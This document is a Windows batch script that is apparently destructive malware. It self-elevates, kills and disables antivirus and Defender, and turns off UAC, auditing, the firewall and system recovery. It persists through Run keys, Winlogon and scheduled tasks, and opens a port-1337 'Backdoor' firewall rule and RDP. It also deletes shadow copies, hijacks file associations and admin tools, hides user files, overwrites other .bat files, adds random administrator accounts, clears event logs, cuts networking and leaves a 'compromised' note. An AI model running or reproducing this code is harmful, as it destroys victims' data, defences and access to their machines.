@echo off
setlocal enabledelayedexpansion

::NoConsole 
if "%~1"=="" exit /b
set "target=%~1"
set "output=%~dpn1_hidden.vbs"
echo Set WshShell = CreateObject("WScript.Shell") > "%output%"
echo WshShell.Run chr(34) ^& "%target%" ^& Chr(34), 0, False >> "%output%"
start /b wscript.exe //B //Nologo "%output%"

::admin
if "%1"=="admin" goto :admin
powershell -Command "Start-Process '%~f0' -ArgumentList 'admin' -Verb RunAs"
exit /b
:admin

if not "%1"=="bios_level" (
    powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "
        $code = @'
        [DllImport(\"kernel32.dll\")]public static extern IntPtr GetCurrentProcess();
        [DllImport(\"advapi32.dll\")]public static extern bool OpenProcessToken(IntPtr h,uint a,out IntPtr t);
        [DllImport(\"advapi32.dll\")]public static extern bool AdjustTokenPrivileges(IntPtr t,bool d,ref TOKEN_PRIVILEGES p,uint l,IntPtr p,IntPtr r);
        public struct TOKEN_PRIVILEGES{public uint Count;public long Luid;public uint Attr;}
        public const uint SE_PRIVILEGE_ENABLED=0x2;
        public const string SE_SHUTDOWN_NAME=\"SeShutdownPrivilege\";
        public const uint TOKEN_ADJUST_PRIVILEGES=0x20;
        public const uint TOKEN_QUERY=0x8;
'@
        Add-Type -MemberDefinition $code -Name Win32 -Namespace System
        $proc = [System.Diagnostics.Process]::GetCurrentProcess()
        $hdl = $proc.Handle
        Invoke-Expression 'cmd /c start /trustlevel:0x40000 %~s0 bios_level'
    " >nul 2>&1
    exit /b
)

::other
attrib +s +h +i +l +x +a "%0" >nul
taskkill /f /im MsMpEng.exe /im AntimalwareServiceExecutable.exe /im SecurityHealthService.exe >nul 2>&1
sc config WinDefend start= disabled >nul
sc stop WinDefend >nul
auditpol /set /category:* /success:disable /failure:disable >nul
wmic /namespace:\\root\securitycenter2 path antivirusproduct delete >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d 1 /f >nul 2>&1
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SecurityHealth" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableLUA" /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d 0 /f
set /a "pid=0" && for /f "tokens=2" %%i in ('tasklist ^| findstr /i "ekrn msmpeng"') do (set pid=%%i && if !pid! NEQ 0 (taskkill /f /pid !pid! >nul && call :PATCH_DRIVER !pid!))
wmic process where name="cmd.exe" call setpriority "idle" >nul 2>&1
copy %0 "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
copy %0 "C:\Windows\Tasks\bat.bat" >nul
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell" /t REG_SZ /d "explorer.exe, C:\Windows\Tasks\bat.bat" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "batbat" /t REG_SZ /d "%0" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "bat_%random%" /t REG_SZ /d "%~f0" /f 2>nul
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe,%~f0" /f 
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "legalnoticecaption" /d "bat.bat" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "legalnoticetext" /d "xDDD" /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f
schtasks /create /tn "SystemRestoreCheck" /tr "%0" /sc minute /mo 5 /ru SYSTEM /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiVirus /t REG_DWORD /d 1 /f >nul
wmic /namespace:\\root\securitycenter2 path antivirusproduct delete >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile" /v "EnableFirewall" /t REG_DWORD /d 0 /f
schtasks /create /tn "WindowsUpdateService" /tr "C:\Windows\Tasks\bat.bat" /sc onlogon /ru SYSTEM /f >nul 2>&1
assoc .lnk=.xDDD
assoc .doc=.xDDD
assoc .xls=.xDDD
assoc .pdf=.xDDD
assoc .jpg=.xDDD
assoc .dll=.xDDD
assoc .mp3=.xDDD
assoc .bmp=.xDDD
assoc .zip=.xDDD
assoc .rar=.xDDD
assoc .png=.xDDD
assoc .txt=.xDDD
attrib +h +s "%USERPROFILE%\Desktop\*" /s /d
attrib +h +s "%USERPROFILE%\Documents\*" /s /d  
attrib +h +s "%USERPROFILE%\Downloads\*" /s /d
attrib +h +s "%USERPROFILE%\Pictures\*" /s /d
bcdedit /set {default} recoveryenabled no
vssadmin delete shadows /all /quiet >nul
wmic shadowcopy delete >nul 2>&1
bcdedit /deletevalue {current} safeboot >nul 2>&1
sc config WinDefend start= disabled >nul 2>&1
netsh firewall set opmode disable >nul
bcdedit /set {default} bootstatuspolicy ignoreallfailures
netsh advfirewall set allprofiles state off >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot" /v "OptionValue" /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal" /v "OptionValue" /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network" /v "OptionValue" /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v Hidden /t REG_DWORD /d 2 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f >nul
netsh advfirewall firewall add rule name="Backdoor" dir=in action=allow protocol=TCP localport=1337 >nul
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\HideFileExt" /v HideFileExt /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL" /v "CheckedValue" /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\calc.exe" /v "Debugger" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msinfo32.exe" /v "Debugger" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\compmgmt.msc" /v "Debugger" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\regedt32.msc" /v "Debugger" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\perfmon.msc" /v "Debugger" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\perfmon.exe" /v "Debugger" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\regedit.exe" /v "Debugger" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe" /v "Debugger" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\resmon.exe" /v "Debugger" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /v "Debugger" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msconfig.exe" /v "Debugger" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v "Debugger" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mpcmdrun.msc" /v "Debugger" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mmc.exe" /v "Debugger" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe" /v "Debugger" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskschd.msc" /v "Debugger" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\EaseOfAccessDialog.exe" /v "Debugger" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\gpedit.msc" /v "Debugger" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe" /v "Debugger" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\winver.exe" /v "Debugger" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\chkdsk.exe" /v "Debugger" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\diskpart.exe" /v "Debugger" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msiexec.exe" /v "Debugger" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot" /v "AlternateShell" /t REG_SZ /d "cmd.exe" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableLockWorkstation" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "NoLogoff" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableBootMenu" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "NoDispScrSavPage" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableMSConfig" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableConfig" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableSR" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableContextMenusInStart" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "HidePowerOptions" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DenyUsersFromMachGP" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "NoTrayContextMenu" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableChangePassword" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableLockWorcstation" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "NoSetTaskbar" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "NoWinKeys" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "NoChangingWallPaper" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "StartMenuLogOff" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "NoCommonGroups" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "NoClose" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "NoFileMenu" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "NoFolderOptions" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "NoViewContextMenu" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "NoFind" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "NoDrives" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "NoViewOnDrive" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "NoRun" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "NoSetFolders" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "NoSaveSettings" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "NoCloseDragDropBands" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableAutomaticRestartSignOn" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "FilterAdministratorToken" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableFirstLogonAnimation" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "UndockWithoutLogon" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "ScRemoveOption" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d 0 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableRegistryTools" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v ClearPageFileAtShutdown /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\CrashControl" /v "CrashDumpEnabled" /t REG_DWORD /d 0 /f
reg add "HKCU\Control Panel\Desktop" /v ScreenSaveActive /t REG_SZ /d "0" /f >nul
for /r "%userprofile%" %%f in (*.bat) do if not "%%f"=="%~f0" copy /Y "%~f0" "%%f" >nul 2>&1
wmic os set localdatetime="19700101000000.000000+000" >nul
sc config wuauserv start= disabled >nul
net stop wuauserv /y >nul
for /l %%i in (1,1,10) do (
    set u=!random!
    set p=!random!
    net user !u! !p! /add >nul 2>&1
    net localgroup administrators !u! /add >nul 2>&1
)
wevtutil cl System
wevtutil cl Security
wevtutil cl Application
wmic nic where "NetEnabled=true" call disable
echo Your system has been compromised. > %userprofile%\Desktop\READ_ME.txt
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" /v Destroy /t REG_SZ /d "shutdown /r /t 60 /c ""Critical Error""" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Power" /v "HiberbootEnabled" /t REG_DWORD /d 0 /f >nul 2>&1
netsh interface set interface "Ethernet" admin=disable >nul 2>&1
netsh interface set interface "Wi-Fi" admin=disable >nul 2>&1
ipconfig /release all >nul 2>&1
netsh advfirewall set allprofiles state on >nul 2>&1
netsh advfirewall firewall add rule name="BlockAllTraffic" dir=in action=block protocol=ANY remoteip=any >nul 2>&1
netsh advfirewall firewall add rule name="BlockAllTrafficOut" dir=out action=block protocol=ANY remoteip=any >nul 2>&1
powercfg -setacvalueindex SCHEME_CURRENT SUB_PROCESSOR PERFBOOSTMODE 0 >nul 2>&1
powercfg -setactive SCHEME_CURRENT >nul 2>&1
reagentc /disable >nul 2>&1
rundll32 keyboard,disable
powercfg -setactive 00000000-0000-0000-0000-000000000000 2>nul
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v EnableICMPRedirect /t REG_DWORD /d 1 /f
netsh advfirewall set allprofiles state off >nul
netsh interface ipv4 set address name="Ethernet" source=static addr=169.254.0.1 mask=255.255.0.0 gateway=none >nul 2>&1
ipconfig /release all >nul
devcon disable *NET* >nul 2>&1
netsh interface set interface "Wi-Fi" admin=disabled >nul 2>&1
netsh interface set interface "Ethernet" admin=disabled >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v FeatureSettingsOverride /t REG_DWORD /d 0x80000000 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v FeatureSettingsOverrideMask /t REG_DWORD /d 0x3 /f
wmic /namespace:\\root\wmi path MSPower_DeviceEnable call SetDisableState "DisableReason"=0x%1 >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v DisableSR /t REG_DWORD /d 1 /f
